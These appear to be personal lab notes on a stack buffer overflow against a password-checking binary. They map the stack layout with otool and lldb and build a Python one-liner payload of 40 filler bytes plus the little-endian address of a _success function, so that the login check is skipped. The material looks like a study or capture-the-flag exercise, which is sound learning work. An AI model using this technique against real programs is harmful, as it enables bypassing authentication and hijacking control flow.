Made a blank password file and passed it in - SUCCESS!
Set correct password and passed it in - SUCCESS!
Set wrong password and passed it in - FAILURE!
Read with oTool

stack pointer is 38 down (56 in decimal)

32 size buffer in decimal
fd = 4 bytes
pwLen = 4 bytes

buffer is 10 up from stack pointer (16 in decimal)


***return address***
0x38

0x34 pwLen

0x30 fd

0x10 Buffer

0x00
******


Want to overwrite address at 0x39 (57 in decimal)
We start from 0x10 (16 in decimal)
So we need something 40 chars long and then the important return address

return address of _success - 0000000100000e40
return address is 8 bytes


python -c 'print "a"*40 + "\x00\x00\x00\x01\x00\x00\x0e\40", ' > password.txt

oops - should be reversed:
python -c 'print "a"*40 + "\x40\x0e\x00\x00\x01\x00\x00\00", ' > password.txt




ran lldb
placed breakpoint in login function
looked at values with x -c 64 rsp
at beginning - return address - 31 0e 00 00 01 00 00 00
after read - return address - 40 0e 00 00 01 00 00 00

oops - jumped ahead before... already found the correct return address just from otool...
